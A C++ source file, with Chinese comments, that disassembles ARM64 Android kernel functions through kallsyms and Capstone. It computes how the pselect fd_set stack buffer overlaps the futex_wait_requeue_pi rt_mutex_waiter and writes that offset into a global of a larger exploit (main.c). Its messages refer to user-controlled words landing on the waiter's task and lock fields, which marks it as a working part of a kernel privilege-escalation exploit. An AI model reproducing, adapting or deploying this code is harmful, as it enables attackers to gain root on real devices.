/*
 * derive_pselect_shift.cpp — C++ 实现 PSELECT_WAITER_WORD_SHIFT 的运行时推导
 *
 * 对应 tools/extract_target.py 的 derive_pselect_layout (:914)。
 *
 * 依赖:
 *   - capstone 5.0.7 (ARM64 反汇编)
 *   - 用户已封装的 kallsyms 接口 (见下方 extern 声明)
 *   - (可选) BTF 接口; 无 BTF 时退化为 memset 模式
 *
 * 用法:
 *   调用 compute_pselect_waiter_word_shift() 即可将结果写入
 *   main.c:55 的全局变量 PSELECT_WAITER_WORD_SHIFT。
 *
 * 构建 (示例):
 *   aarch64-linux-android35-clang++ -O2 -std=c++17 \
 *       -I<capstone-install>/include \
 *       derive_pselect_shift.cpp -o derive_pselect_shift.o \
 *       -L<capstone-install>/lib -lcapstone
 */

#include <capstone/capstone.h>

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <functional>
#include <optional>
#include <set>
#include <string>
#include <vector>

/* ============================================================================
 * 用户适配区: 替换为你的 kallsyms / BTF 封装
 * ============================================================================ */

struct KSym {
    std::string name;
    uint64_t    start;
    uint64_t    end;   /* end = 下一个符号 start (或 start + cap) */
};

/* 按名字查符号; 找不到返回 std::nullopt */
extern std::optional<KSym> kallsyms_lookup(const std::string& name);

/* 读取内核 .text 中 [start, start+len) 的字节到 out; 成功返回 true */
extern bool read_kernel_text(uint64_t start, size_t len, uint8_t* out);

/* (可选) BTF 字段偏移; 无 BTF 时返回 std::nullopt, 走 memset 退化路径 */
extern std::optional<uint32_t> btf_field_offset(const std::string& type,
                                                const std::string& field);

/* main.c:55 的全局变量, C 链接 */
extern "C" uint32_t PSELECT_WAITER_WORD_SHIFT;

/* ============================================================================
 * 常量
 * ============================================================================ */

static constexpr uint64_t OBJDUMP_CAP = 0x4000;   /* 单函数扫描上限 */

static const char* PSELECT_WRAPPER  = "__arm64_sys_pselect6";
static const char* PSELECT_DISPATCH = "do_pselect";          /* 可选 */
static const char* PSELECT_CORE     = "core_sys_select";
static const char* FUTEX_WRAPPER    = "__arm64_sys_futex";
static const char* FUTEX_DISPATCH   = "do_futex";            /* 可选 */
static const char* FUTEX_WAIT       = "futex_wait_requeue_pi";

/* ============================================================================
 * DisasmRange — RAII 管理 cs_insn 数组
 * ============================================================================ */

class DisasmRange {
public:
    DisasmRange() = default;
    DisasmRange(cs_insn* i, size_t n) : insns_(i), count_(n) {}
    DisasmRange(DisasmRange&& o) noexcept
        : insns_(o.insns_), count_(o.count_) {
        o.insns_ = nullptr; o.count_ = 0;
    }
    DisasmRange& operator=(DisasmRange&& o) noexcept {
        if (this != &o) {
            if (insns_) cs_free(insns_, count_);
            insns_ = o.insns_; count_ = o.count_;
            o.insns_ = nullptr; o.count_ = 0;
        }
        return *this;
    }
    ~DisasmRange() { if (insns_) cs_free(insns_, count_); }

    DisasmRange(const DisasmRange&) = delete;
    DisasmRange& operator=(const DisasmRange&) = delete;

    size_t      size() const { return count_; }
    cs_insn*    data()       { return insns_; }
    cs_insn&    operator[](size_t i)       { return insns_[i]; }
    const cs_insn& operator[](size_t i) const { return insns_[i]; }
    cs_insn*    begin()      { return insns_; }
    cs_insn*    end()        { return insns_ + count_; }

private:
    cs_insn* insns_ = nullptr;
    size_t   count_ = 0;
};

/* ============================================================================
 * CapstoneSession
 * ============================================================================ */

class CapstoneSession {
public:
    CapstoneSession() {
        if (cs_open(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN, &handle_) != CS_ERR_OK) {
            fprintf(stderr, "cs_open failed\n");
            return;
        }
        cs_option(handle_, CS_OPT_DETAIL, CS_OPT_ON);
        valid_ = true;
    }
    ~CapstoneSession() { if (valid_) cs_close(&handle_); }

    bool valid() const { return valid_; }
    csh  handle() const { return handle_; }

    /* 反汇编 [start, end), end 截断到 start + OBJDUMP_CAP */
    DisasmRange disasm(uint64_t start, uint64_t end) const {
        if (!valid_ || end <= start) return {};
        size_t len = (size_t)(end - start);
        if (len > OBJDUMP_CAP) len = OBJDUMP_CAP;

        std::vector<uint8_t> code(len);
        if (!read_kernel_text(start, len, code.data())) {
            fprintf(stderr, "read_kernel_text failed @0x%lx len %zu\n", start, len);
            return {};
        }

        cs_insn* insns = nullptr;
        size_t n = cs_disasm(handle_, code.data(), len, start, 0, &insns);
        return DisasmRange(insns, n);
    }

private:
    csh  handle_ = 0;
    bool valid_  = false;
};

/* ============================================================================
 * 指令模式匹配 (对应 Python 正则)
 * ============================================================================ */

/* SUB sp, sp, #imm12  → frame size  (first_sp_frame, :874) */
static std::optional<uint32_t> match_sub_sp_sp_imm(const cs_insn& ins) {
    if (ins.id != ARM64_INS_SUB) return std::nullopt;
    const cs_detail* d = ins.detail;
    if (!d || d->arm64.op_count != 3) return std::nullopt;
    const cs_arm64_op* o = d->arm64.operands;
    if (o[0].type != ARM64_OP_REG || o[0].reg != ARM64_REG_SP) return std::nullopt;
    if (o[1].type != ARM64_OP_REG || o[1].reg != ARM64_REG_SP) return std::nullopt;
    if (o[2].type != ARM64_OP_IMM) return std::nullopt;
    return (uint32_t)o[2].imm;
}

/* BL imm  → call target  (has_direct_call, :881) */
static std::optional<uint64_t> match_bl(const cs_insn& ins) {
    if (ins.id != ARM64_INS_BL) return std::nullopt;
    const cs_detail* d = ins.detail;
    if (!d || d->arm64.op_count != 1) return std::nullopt;
    const cs_arm64_op* o = d->arm64.operands;
    if (o[0].type != ARM64_OP_IMM) return std::nullopt;
    return (uint64_t)o[0].imm;
}

/* ADD xN, sp, #imm  → (reg, imm) */
struct AddSpImm { int reg; uint32_t imm; };
static std::optional<AddSpImm> match_add_xn_sp_imm(const cs_insn& ins) {
    if (ins.id != ARM64_INS_ADD) return std::nullopt;
    const cs_detail* d = ins.detail;
    if (!d || d->arm64.op_count != 3) return std::nullopt;
    const cs_arm64_op* o = d->arm64.operands;
    if (o[0].type != ARM64_OP_REG) return std::nullopt;
    if (o[1].type != ARM64_OP_REG || o[1].reg != ARM64_REG_SP) return std::nullopt;
    if (o[2].type != ARM64_OP_IMM) return std::nullopt;
    return AddSpImm{ (int)o[0].reg, (uint32_t)o[2].imm };
}

/* ADD xM, xN, #imm  → (rd, rn, imm)  (任意 base reg, 用于 pi_tree 检测) */
struct AddRegImm { int rd, rn; uint32_t imm; };
static std::optional<AddRegImm> match_add_xm_xn_imm(const cs_insn& ins) {
    if (ins.id != ARM64_INS_ADD) return std::nullopt;
    const cs_detail* d = ins.detail;
    if (!d || d->arm64.op_count != 3) return std::nullopt;
    const cs_arm64_op* o = d->arm64.operands;
    if (o[0].type != ARM64_OP_REG) return std::nullopt;
    if (o[1].type != ARM64_OP_REG) return std::nullopt;
    if (o[2].type != ARM64_OP_IMM) return std::nullopt;
    return AddRegImm{ (int)o[0].reg, (int)o[1].reg, (uint32_t)o[2].imm };
}

/* CMP xA, xB (寄存器形式, 即 SUBS xzr, xA, xB) → (rn, rm) */
struct CmpRegs { int rn, rm; };
static std::optional<CmpRegs> match_cmp_reg_reg(const cs_insn& ins) {
    if (ins.id != ARM64_INS_CMP) return std::nullopt;
    const cs_detail* d = ins.detail;
    if (!d || d->arm64.op_count != 2) return std::nullopt;
    const cs_arm64_op* o = d->arm64.operands;
    if (o[0].type != ARM64_OP_REG || o[1].type != ARM64_OP_REG)
        return std::nullopt;
    return CmpRegs{ (int)o[0].reg, (int)o[1].reg };
}

/* STP xzr, xzr, [sp, #imm]  → imm  (无 BTF 时的 memset 模式) */
static std::optional<uint32_t> match_stp_xzr_xzr_sp_imm(const cs_insn& ins) {
    if (ins.id != ARM64_INS_STP) return std::nullopt;
    const cs_detail* d = ins.detail;
    if (!d || d->arm64.op_count != 3) return std::nullopt;
    const cs_arm64_op* o = d->arm64.operands;
    if (o[0].type != ARM64_OP_REG || o[0].reg != ARM64_REG_XZR) return std::nullopt;
    if (o[1].type != ARM64_OP_REG || o[1].reg != ARM64_REG_XZR) return std::nullopt;
    if (o[2].type != ARM64_OP_MEM) return std::nullopt;
    if (o[2].mem.base != ARM64_REG_SP) return std::nullopt;
    return (uint32_t)o[2].mem.disp;
}

/* RET */
static bool match_ret(const cs_insn& ins) {
    return ins.id == ARM64_INS_RET;
}

/* ADD sp, sp, #imm (SP 释放, 帧销毁信号) */
static bool match_add_sp_sp_imm(const cs_insn& ins) {
    if (ins.id != ARM64_INS_ADD) return false;
    const cs_detail* d = ins.detail;
    if (!d || d->arm64.op_count != 3) return false;
    const cs_arm64_op* o = d->arm64.operands;
    return o[0].type == ARM64_OP_REG && o[0].reg == ARM64_REG_SP &&
           o[1].type == ARM64_OP_REG && o[1].reg == ARM64_REG_SP &&
           o[2].type == ARM64_OP_IMM;
}

/* ============================================================================
 * first_sp_frame — 函数内第一条 SUB sp, sp, #imm 的 imm  (:874)
 * ============================================================================ */

static std::optional<uint32_t> first_sp_frame(const DisasmRange& dis,
                                              const char* name) {
    for (const cs_insn& ins : dis) {
        if (auto imm = match_sub_sp_sp_imm(ins)) return imm;
    }
    fprintf(stderr, "%s has no explicit `sub sp,sp,#imm` frame\n", name);
    return std::nullopt;
}

/* ============================================================================
 * has_direct_call — 函数内是否有 BL target  (:881)
 * ============================================================================ */

static bool has_direct_call(const DisasmRange& dis, uint64_t target) {
    for (const cs_insn& ins : dis) {
        if (auto t = match_bl(ins); t && *t == target) return true;
    }
    return false;
}

/* ============================================================================
 * validate_frame_live_at — 验证 sub sp 帧在锚点处仍存活  (:885)
 * 简化版: 锚点前只有一条 sub sp, 且其间没有 add sp,sp 或 ret
 * ============================================================================ */

static bool validate_frame_live_at(
        const DisasmRange& dis,
        const std::function<bool(const cs_insn&)>& is_anchor,
        const char* name,
        const char* anchor_desc) {
    int anchor_idx = -1;
    for (size_t i = 0; i < dis.size(); i++) {
        if (is_anchor(dis[i])) {
            if (anchor_idx >= 0) {
                fprintf(stderr, "%s frame anchor not unique (%s)\n",
                        name, anchor_desc);
                return false;
            }
            anchor_idx = (int)i;
        }
    }
    if (anchor_idx < 0) {
        fprintf(stderr, "%s anchor not found (%s)\n", name, anchor_desc);
        return false;
    }

    /* 锚点之前的 sub sp,sp,#imm */
    int first_sub = -1;
    int sub_count = 0;
    for (int i = 0; i < anchor_idx; i++) {
        if (match_sub_sp_sp_imm(dis[i])) {
            if (sub_count == 0) first_sub = i;
            sub_count++;
        }
    }
    if (sub_count != 1) {
        fprintf(stderr, "%s has %d SP frames before anchor (%s)\n",
                name, sub_count, anchor_desc);
        return false;
    }

    /* sub 之后到锚点之间: 不允许 add sp,sp 或 ret */
    for (int i = first_sub + 1; i < anchor_idx; i++) {
        if (match_add_sp_sp_imm(dis[i])) {
            fprintf(stderr, "%s restores SP before anchor (%s)\n",
                    name, anchor_desc);
            return false;
        }
        if (match_ret(dis[i])) {
            fprintf(stderr, "%s ret before anchor (%s)\n",
                    name, anchor_desc);
            return false;
        }
    }
    return true;
}

/* ============================================================================
 * derive_pselect_shift — 主逻辑  (对应 :914)
 * ============================================================================ */

struct PselectLayout {
    uint32_t PSELECT_WAITER_WORD_SHIFT;
    uint32_t waiter_local;
    int64_t  pselect_word0;
    int64_t  futex_waiter;
    uint32_t pselect_buffer;
    std::vector<std::string> pselect_chain;
    std::vector<std::string> futex_chain;
};

static std::optional<PselectLayout> derive_pselect_shift() {
    CapstoneSession cs;
    if (!cs.valid()) return std::nullopt;

    /* ---- 1. 查找符号 ---- */
    auto sw  = kallsyms_lookup(PSELECT_WRAPPER);
    auto sc  = kallsyms_lookup(PSELECT_CORE);
    auto sd  = kallsyms_lookup(PSELECT_DISPATCH);   /* 可选 */
    auto fw  = kallsyms_lookup(FUTEX_WRAPPER);
    auto fwt = kallsyms_lookup(FUTEX_WAIT);
    auto fd  = kallsyms_lookup(FUTEX_DISPATCH);      /* 可选 */

    if (!sw || !sc || !fw || !fwt) {
        fprintf(stderr, "missing required kallsyms symbol\n");
        return std::nullopt;
    }

    /* ---- 2. 反汇编 ---- */
    DisasmRange dis_sw  = cs.disasm(sw->start,  sw->end);
    DisasmRange dis_sc  = cs.disasm(sc->start,  sc->end);
    DisasmRange dis_fw  = cs.disasm(fw->start,  fw->end);
    DisasmRange dis_fwt = cs.disasm(fwt->start, fwt->end);
    DisasmRange dis_sd, dis_fd;
    if (sd) dis_sd = cs.disasm(sd->start, sd->end);
    if (fd) dis_fd = cs.disasm(fd->start, fd->end);

    /* ---- 3. 确定 pselect 调用链  (:940-954) ---- */
    std::vector<std::string> pselect_chain = {PSELECT_WRAPPER};
    std::vector<const DisasmRange*> pselect_dis = {&dis_sw};

    uint64_t core_addr = sc->start;
    if (has_direct_call(dis_sw, core_addr)) {
        /* 直接调用 core_sys_select */
    } else if (sd && has_direct_call(dis_sw, sd->start)) {
        if (!has_direct_call(dis_sd, core_addr)) {
            fprintf(stderr, "do_pselect does not directly call core_sys_select\n");
            return std::nullopt;
        }
        pselect_chain.push_back(PSELECT_DISPATCH);
        pselect_dis.push_back(&dis_sd);
    } else {
        fprintf(stderr,
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect\n");
        return std::nullopt;
    }
    pselect_chain.push_back(PSELECT_CORE);
    pselect_dis.push_back(&dis_sc);

    /* ---- 4. 确定 futex 调用链  (:956-972) ---- */
    std::vector<std::string> futex_chain = {FUTEX_WRAPPER};
    std::vector<const DisasmRange*> futex_dis = {&dis_fw};

    uint64_t fwait_addr = fwt->start;
    if (has_direct_call(dis_fw, fwait_addr)) {
        /* 直接调用 futex_wait_requeue_pi */
    } else if (fd && has_direct_call(dis_fw, fd->start)) {
        if (!has_direct_call(dis_fd, fwait_addr)) {
            fprintf(stderr,
                "do_futex does not directly call futex_wait_requeue_pi\n");
            return std::nullopt;
        }
        futex_chain.push_back(FUTEX_DISPATCH);
        futex_dis.push_back(&dis_fd);
    } else {
        fprintf(stderr,
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi\n");
        return std::nullopt;
    }
    futex_chain.push_back(FUTEX_WAIT);
    futex_dis.push_back(&dis_fwt);

    /* ---- 5. 每层 frame size  (:986) ---- */
    auto get_frame = [](const DisasmRange& dis,
                        const std::string& name) -> std::optional<uint32_t> {
        return first_sp_frame(dis, name.c_str());
    };

    uint64_t sum_pselect = 0, sum_futex = 0;
    for (size_t i = 0; i < pselect_chain.size(); i++) {
        auto f = get_frame(*pselect_dis[i], pselect_chain[i]);
        if (!f) return std::nullopt;
        sum_pselect += *f;
    }
    for (size_t i = 0; i < futex_chain.size(); i++) {
        auto f = get_frame(*futex_dis[i], futex_chain[i]);
        if (!f) return std::nullopt;
        sum_futex += *f;
    }

    /* ---- 6. waiter_local  (futex_wait_requeue_pi)  (:994-1025) ---- */
    auto pi_tree_opt    = btf_field_offset("rt_mutex_waiter", "pi_tree");
    auto wake_state_opt = btf_field_offset("rt_mutex_waiter", "wake_state");

    /* 收集 futex_wait 内所有 add xN, sp, #imm */
    std::vector<AddSpImm> fwait_adds;
    for (const cs_insn& ins : dis_fwt) {
        if (auto a = match_add_xn_sp_imm(ins)) fwait_adds.push_back(*a);
    }

    struct WaiterCand { int reg; uint32_t imm; };
    std::vector<WaiterCand> waiter_cands;

    for (const auto& a : fwait_adds) {
        if (pi_tree_opt) {
            /* 有 BTF: 检查 add xM, xN, #pi_tree 是否存在 */
            bool ok = false;
            for (const cs_insn& ins : dis_fwt) {
                if (auto m = match_add_xm_xn_imm(ins)) {
                    if (m->rn == a.reg && m->imm == *pi_tree_opt) {
                        ok = true; break;
                    }
                }
            }
            if (ok) waiter_cands.push_back({a.reg, a.imm});
        } else {
            /* 无 BTF: 检查 stp xzr, xzr, [sp, #imm] memset 模式 */
            for (const cs_insn& ins : dis_fwt) {
                if (auto stp_imm = match_stp_xzr_xzr_sp_imm(ins)) {
                    if (*stp_imm == a.imm) {
                        waiter_cands.push_back({a.reg, a.imm});
                        break;
                    }
                }
            }
        }
    }

    /* 按 imm 去重  (:1013) */
    std::set<uint32_t> seen;
    std::vector<WaiterCand> unique_cands;
    for (const auto& c : waiter_cands) {
        if (seen.insert(c.imm).second) unique_cands.push_back(c);
    }
    if (unique_cands.size() != 1) {
        fprintf(stderr, "futex waiter stack local not unique: %zu cands\n",
                unique_cands.size());
        return std::nullopt;
    }
    uint32_t waiter_local = unique_cands[0].imm;
    int      waiter_reg   = unique_cands[0].reg;

    /* validate_frame_live_at  (:1021) */
    {
        char anchor[64];
        snprintf(anchor, sizeof(anchor),
                 "add w%d, sp, #0x%x", waiter_reg, waiter_local);
        if (!validate_frame_live_at(
                dis_fwt,
                [&](const cs_insn& ins) {
                    auto a = match_add_xn_sp_imm(ins);
                    return a && a->reg == waiter_reg && a->imm == waiter_local;
                },
                FUTEX_WAIT, anchor)) {
            fprintf(stderr, "waiter frame validation failed\n");
            return std::nullopt;
        }
    }

    /* 交叉校验: waiter_local (及 wake_state) 处有真实字段存储  (:1026) */
    {
        bool found_waiter = false;
        for (const cs_insn& ins : dis_fwt) {
            const cs_detail* d = ins.detail;
            if (!d) continue;
            /* 任何 [sp, #waiter_local] 的访问都算 */
            for (uint8_t i = 0; i < d->arm64.op_count; i++) {
                const cs_arm64_op& o = d->arm64.operands[i];
                if (o.type == ARM64_OP_MEM &&
                    o.mem.base == ARM64_REG_SP &&
                    (uint32_t)o.mem.disp == waiter_local) {
                    found_waiter = true;
                    break;
                }
            }
        }
        if (!found_waiter) {
            fprintf(stderr,
                "futex waiter candidate 0x%x not cross-validated by a real "
                "field store\n", waiter_local);
            return std::nullopt;
        }
    }

    /* ---- 7. pselect_buffer  (core_sys_select)  (:1036-1058) ---- */
    std::vector<AddSpImm> core_adds;
    for (const cs_insn& ins : dis_sc) {
        if (auto a = match_add_xn_sp_imm(ins)) core_adds.push_back(*a);
    }
    std::vector<CmpRegs> core_cmps;
    for (const cs_insn& ins : dis_sc) {
        if (auto c = match_cmp_reg_reg(ins)) core_cmps.push_back(*c);
    }

    std::set<uint32_t> buffer_cands;
    for (const auto& a : core_adds) {
        for (const auto& peer : core_adds) {
            if (peer.imm != a.imm || peer.reg == a.reg) continue;
            /* 检查 cmp a,peer 或 cmp peer,a */
            for (const auto& c : core_cmps) {
                if ((c.rn == a.reg && c.rm == peer.reg) ||
                    (c.rn == peer.reg && c.rm == a.reg)) {
                    buffer_cands.insert(a.imm);
                    break;
                }
            }
        }
    }
    if (buffer_cands.size() != 1) {
        fprintf(stderr,
            "core_sys_select fd_set buffer candidates not unique: %zu\n",
            buffer_cands.size());
        return std::nullopt;
    }
    uint32_t pselect_buffer = *buffer_cands.begin();

    /* validate_frame_live_at for buffer reg  (:1067) */
    {
        /* 找承载该 imm 的寄存器 */
        for (const auto& a : core_adds) {
            if (a.imm != pselect_buffer) continue;
            char anchor[64];
            snprintf(anchor, sizeof(anchor),
                     "add x%d, sp, #0x%x", a.reg, pselect_buffer);
            if (!validate_frame_live_at(
                    dis_sc,
                    [&](const cs_insn& ins) {
                        auto m = match_add_xn_sp_imm(ins);
                        return m && m->reg == a.reg && m->imm == pselect_buffer;
                    },
                    PSELECT_CORE, anchor)) {
                fprintf(stderr, "buffer frame validation failed\n");
                return std::nullopt;
            }
        }
    }

    /* ---- 8. 计算 shift  (:1085-1102) ---- */
    int64_t pselect_word0 = -(int64_t)sum_pselect + (int64_t)pselect_buffer;
    int64_t futex_waiter  = -(int64_t)sum_futex  + (int64_t)waiter_local;
    int64_t delta = futex_waiter - pselect_word0;

    if (delta < 0 || delta % 8 != 0) {
        fprintf(stderr,
            "pselect/futex overlap is not a non-negative qword: %ld\n",
            (long)delta);
        return std::nullopt;
    }
    uint32_t shift = (uint32_t)(delta / 8);

    if (shift > 16) {
        fprintf(stderr, "PSELECT_WAITER_WORD_SHIFT too large: %u\n", shift);
        return std::nullopt;
    }
    if (shift > 3) {
        fprintf(stderr,
            "futex waiter starts %u qwords above the fd_set buffer; "
            "task/lock would land outside the user-controlled words 0..14 "
            "(max feasible shift is 3)\n", shift);
        return std::nullopt;
    }
    if (shift == 3) {
        fprintf(stderr,
            "warning: waiter fits at the last usable word (shift=3); "
            "wake_state falls outside the copied fd_set and relies on the "
            "kernel zero-initialising it\n");
    }

    /* ---- 9. 返回 ---- */
    PselectLayout out{};
    out.PSELECT_WAITER_WORD_SHIFT = shift;
    out.waiter_local   = waiter_local;
    out.pselect_word0  = pselect_word0;
    out.futex_waiter   = futex_waiter;
    out.pselect_buffer = pselect_buffer;
    out.pselect_chain  = pselect_chain;
    out.futex_chain    = futex_chain;
    return out;
}

/* ============================================================================
 * 入口: 计算 PSELECT_WAITER_WORD_SHIFT 并写入全局变量
 * ============================================================================ */

bool compute_pselect_waiter_word_shift() {
    auto result = derive_pselect_shift();
    if (!result) {
        fprintf(stderr, "derive_pselect_shift failed\n");
        return false;
    }

    PSELECT_WAITER_WORD_SHIFT = result->PSELECT_WAITER_WORD_SHIFT;

    /* 打印调试信息, 与 Python 输出对比  (对应 :1758) */
    auto join = [](const std::vector<std::string>& v) -> std::string {
        std::string s;
        for (size_t i = 0; i < v.size(); i++) {
            if (i) s += "->";
            s += v[i];
        }
        return s;
    };

    fprintf(stderr,
        "info: pselect chain %s "
        "buffer=0x%x waiter=0x%x shift=%u "
        "(pselect_word0=0x%lx futex_waiter=0x%lx)\n",
        join(result->pselect_chain).c_str(),
        result->pselect_buffer,
        result->waiter_local,
        result->PSELECT_WAITER_WORD_SHIFT,
        (long)result->pselect_word0,
        (long)result->futex_waiter);

    return true;
}

/* ============================================================================
 * 单独编译为离线工具时的 main
 * ============================================================================ */

#ifdef DERIVE_PSELECT_STANDALONE
int main(int argc, char** argv) {
    (void)argc; (void)argv;
    return compute_pselect_waiter_word_shift() ? 0 : 1;
}
#endif
